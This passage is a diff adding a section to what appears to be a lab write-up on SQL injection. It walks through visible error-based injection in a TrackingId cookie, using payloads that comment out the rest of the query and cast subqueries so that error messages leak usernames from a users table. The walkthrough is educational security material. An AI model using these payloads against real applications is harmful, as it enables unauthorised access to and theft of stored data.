@@ -233,3 +233,30 @@ Cookie: TrackingId=XZqKxHXKgUbxQYVh' AND(SELECT CASE WHEN SUBSTR(password,§1§,
 
 
 ## 12.  Visible error-based SQL injection
+
+```
+TrackingId=ogAZZfxtOKUELbuJ'
+```
+In the response, we notice a verbose error message. This discloses the full SQL query, including the value of your cookie. It also explains that you have an unclosed string literal. We also observe that our injection appears inside a single-quoted string.
+
+We add comment characters to comment out the rest of the query, including the extra single-quote character that's causing the error.
+```
+TrackingId=ogAZZfxtOKUELbuJ'--
+```
+Confirm that you we longer receive an error (this suggests that the query is now syntactically valid).
+
+We will adapt the query to include a generic `SELECT` subquery and cast the returned value to an `int` data type.
+```
+TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--
+```
+Now we get a different error saying that an `AND` condition must be a boolean expression.
+
+```
+TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
+```
+We send the request and confirm that we no longer receive an error. This suggests that this is a valid query again.
+
+```
+TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--
+```
+We receive the initial error message again. The query now appears to be truncated due to a character limit. As a result, the comment characters we added to fix up the query aren't included.
